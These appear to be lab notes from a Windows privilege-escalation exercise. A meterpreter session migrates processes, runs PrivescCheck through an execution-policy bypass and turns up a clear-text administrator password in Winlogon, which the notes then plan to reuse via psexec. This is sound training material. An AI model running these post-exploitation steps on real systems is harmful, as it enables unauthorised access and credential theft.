
https://github.com/itm4n/PrivescCheck


```bash
meterpreter > migrate 4660
[*] Migrating from 312 to 4660...
[*] Migration completed successfully.
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege

```

```bash
C:\Users\student\Desktop\PrivescCheck>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+------+------------------------------------------------+------+
| TEST | USER > Identity                                | INFO |
+------+------------------------------------------------+------+
| DESC | Get the full name of the current user (domain +       |
|      | username) along with the associated Security          |
|      | Identifier (SID).                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

DisplayName           SID                                           Type
-----------           ---                                           ----
ATTACKDEFENSE\student S-1-5-21-3688751335-3073641799-161370460-1008 User




+------+------------------------------------------------+------+
| TEST | USER > Groups                                  | INFO |
+------+------------------------------------------------+------+
| DESC | List all the groups that are associated to the        |
|      | current user's token.                                 |
+------+-------------------------------------------------------+
[*] Found 13 result(s).

Name                                   Type           SID                                         
----                                   ----           ---                                         
ATTACKDEFENSE\None                     Group          S-1-5-21-3688751335-3073641799-161370460-513
Everyone                               WellKnownGroup S-1-1-0                                     
BUILTIN\Remote Desktop Users           Alias          S-1-5-32-555                                
BUILTIN\Users                          Alias          S-1-5-32-545                                
NT AUTHORITY\REMOTE INTERACTIVE LOGON  WellKnownGroup S-1-5-14                                    
NT AUTHORITY\INTERACTIVE               WellKnownGroup S-1-5-4                                     
NT AUTHORITY\Authenticated Users       WellKnownGroup S-1-5-11                                    
NT AUTHORITY\This Organization         WellKnownGroup S-1-5-15                                    
NT AUTHORITY\Local account             WellKnownGroup S-1-5-113                                   
NT AUTHORITY\LogonSessionId_0_349012   LogonSession   S-1-5-5-0-349012                            
LOCAL                                  WellKnownGroup S-1-2-0                                     
NT AUTHORITY\NTLM Authentication       WellKnownGroup S-1-5-64-10                                 
Mandatory Label\Medium Mandatory Level Label          S-1-16-8192                                 




+------+------------------------------------------------+------+
| TEST | USER > Privileges                              | INFO |
+------+------------------------------------------------+------+
| DESC | List the current user's privileges and identify the   |
|      | ones that can be leveraged for local privilege        |
|      | escalation.                                           |
+------+-------------------------------------------------------+
[*] Found 2 result(s).

Name                          State   Description                    Exploitable
----                          -----   -----------                    -----------
SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False




+------+------------------------------------------------+------+
| TEST | USER > Environment Variables                   | INFO |
+------+------------------------------------------------+------+
| DESC | List the environment variables of the current process |
|      | and try to identify any potentially sensitive         |
|      | information such as passwords or API secrets. This    |
|      | check is simply based on keyword matching and might   |
|      | not be entirely reliable.                             |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | SERVICES > Non-default Services                | INFO |
+------+------------------------------------------------+------+
| DESC | List all registered services and filter out the ones  |
|      | that are built into Windows. It does so by parsing    |
|      | the target executable's metadata.                     |
+------+-------------------------------------------------------+
[*] Found 5 result(s).


Name        : AmazonSSMAgent
DisplayName : Amazon SSM Agent
ImagePath   : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : AWSLiteAgent
DisplayName : AWS Lite Guest Agent
ImagePath   : "C:\Program Files\Amazon\XenTools\LiteAgent.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : cfn-hup
DisplayName : CloudFormation cfn-hup
ImagePath   : "C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"
User        : LocalSystem
StartMode   : Manual

Name        : MozillaMaintenance
DisplayName : Mozilla Maintenance Service
ImagePath   : "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
User        : LocalSystem
StartMode   : Manual

Name        : ssh-agent
DisplayName : OpenSSH Authentication Agent
ImagePath   : C:\Windows\System32\OpenSSH\ssh-agent.exe
User        : LocalSystem
StartMode   : Disabled





+------+------------------------------------------------+------+
| TEST | SERVICES > Service Permissions                 | VULN |
+------+------------------------------------------------+------+
| DESC | Interact with the Service Control Manager (SCM) and   |
|      | check whether the current user can modify any         |
|      | registered service.                                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Binary Permissions                  | VULN |
+------+------------------------------------------------+------+
| DESC | List all services and check whether the current user  |
|      | can modify the target executable or write files in    |
|      | its parent folder.                                    |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Unquoted Path                       | VULN |
+------+------------------------------------------------+------+
| DESC | List registered services and check whether any of     |
|      | them is configured with an unquoted path that can be  |
|      | exploited.                                            |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > SCM Permissions                     | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the current user can perform any        |
|      | privileged actions on the Service Control Manager     |
|      | (SCM).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SCHEDULED TASKS > Binary Permissions           | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the scheduled tasks that are not owned by   |
|      | the current user and checks whether the target binary |
|      | can be modified. Note that, as a low-privileged user, |
|      | it's not possible to enumerate all the scheduled      |
|      | tasks.                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SCHEDULED TASKS > Unquoted Path                | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the scheduled tasks that are not owned by   |
|      | the current user and checks whether the corresponding |
|      | command uses an exploitable unquoted path. Note that, |
|      | as a low-privileged user, it's not possible to        |
|      | enumerate all the scheduled tasks.                    |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM Backup Files                | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether some backup files of the SAM/SYSTEM     |
|      | hives were created with insecure permissions."        |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > Unattend Files                         | VULN |
+------+------------------------------------------------+------+
| DESC | Locate 'Unattend' files and check whether they        |
|      | contain any clear-text credentials.                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : 
Username : administrator
Password : hello_123321





+------+------------------------------------------------+------+
| TEST | CREDS > Vault Creds                            | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the credentials that are saved in the       |
|      | current user's vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > Vault List                             | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the web credentials that are saved in the   |
|      | current user's Vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > GPP Passwords                          | VULN |
+------+------------------------------------------------+------+
| DESC | Locate old cached Group Policy Preference files that  |
|      | contain a 'cpassword' field and extract the           |
|      | clear-text credentials.                               |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | HARDENING > LSA Protection (RunAsPPL)          | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether LSA protection (a.k.a. RunAsPPL) is    |
|      | supported and enabled.                                |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name     Status Description               
----     ------ -----------               
RunAsPPL  False RunAsPPL is not configured




+------+------------------------------------------------+------+
| TEST | HARDENING > Credential Guard                   | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether Credential Guard is supported and      |
|      | enabled.                                              |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name             Status Description                       
----             ------ -----------                       
Credential Guard  False Credential Guard is not configured




+------+------------------------------------------------+------+
| TEST | HARDENING > BitLocker                          | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether BitLocker is configured and enabled on  |
|      | the system drive. Note that this check will yield a   |
|      | false positive if another encryption software is in   |
|      | use.                                                  |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CONFIG > PATH Folder Permissions               | VULN |
+------+------------------------------------------------+------+
| DESC | Retrieve the list of SYSTEM %PATH% folders and check  |
|      | whether the current user has some write permissions   |
|      | in any of them.                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | MISC > Hijackable DLLs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List Windows services that are prone to Ghost DLL     |
|      | hijacking. This is particularly relevant if the       |
|      | current user can create files in one of the SYSTEM    |
|      | %PATH% folders.                                       |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Name           : cdpsgshims.dll
Description    : Loaded by CDPSvc upon service startup
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler upon service startup
RunAs          : LocalSystem
RebootRequired : True

Name           : wlanapi.dll
Description    : Loaded by NetMan when listing network interfaces
RunAs          : LocalSystem
RebootRequired : False





+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > WSUS Configuration                    | VULN |
+------+------------------------------------------------+------+
| DESC | If WSUS is in use, this check will determine whether  |
|      | or not it uses a secure URL. If not, it might be      |
|      | vulnerable to MitM attacks (c.f. 'WSUXploit' /        |
|      | 'WSuspicious').                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder                     | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the current user can browse the SCCM   |
|      | cache folder. If so, hardcoded credentials might be   |
|      | extracted from MSI package files or scripts.          |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | UPDATES > System up to date?                   | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the installed updates and hotfixes and      |
|      | check whether a patch was applied in the last 31      |
|      | days.                                                 |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


HotFixID    : KB4570720
Description : Update
InstalledBy : ATTACKDEFENSE\Administrator
InstalledOn : 11/7/2020 7:25:04 AM





+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| OK | None | CONFIG > WSUS Configuration                                     |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| KO | Med. | CREDS > WinLogon -> 1 result(s)                                 |
| OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
| OK | None | CREDS > Unattend Files                                          |
| OK | None | CREDS > GPP Passwords                                           |
| NA | None | CREDS > Vault List                                              |
| NA | None | CREDS > Vault Creds                                             |
| NA | None | HARDENING > BitLocker                                           |
| NA | Info | HARDENING > Credential Guard -> 1 result(s)                     |
| NA | Info | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | Info | MISC > Hijackable DLLs -> 3 result(s)                           |
| OK | None | SCHEDULED TASKS > Binary Permissions                            |
| OK | None | SCHEDULED TASKS > Unquoted Path                                 |
| OK | None | SERVICES > SCM Permissions                                      |
| NA | Info | SERVICES > Non-default Services -> 5 result(s)                  |
| OK | None | SERVICES > Binary Permissions                                   |
| OK | None | SERVICES > Unquoted Path                                        |
| OK | None | SERVICES > Service Permissions                                  |
| OK | None | SERVICES > Registry Permissions                                 |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
| NA | Info | USER > Groups -> 13 result(s)                                   |
| NA | Info | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Environment Variables                                    |
| NA | Info | USER > Privileges -> 2 result(s)                                |
+----+------+-----------------------------------------------------------------+
WARNING: To get more info, run this script with the option '-Extended'.

C:\Users\student\Desktop\PrivescCheck>

```

Use psexec to reconnect to the system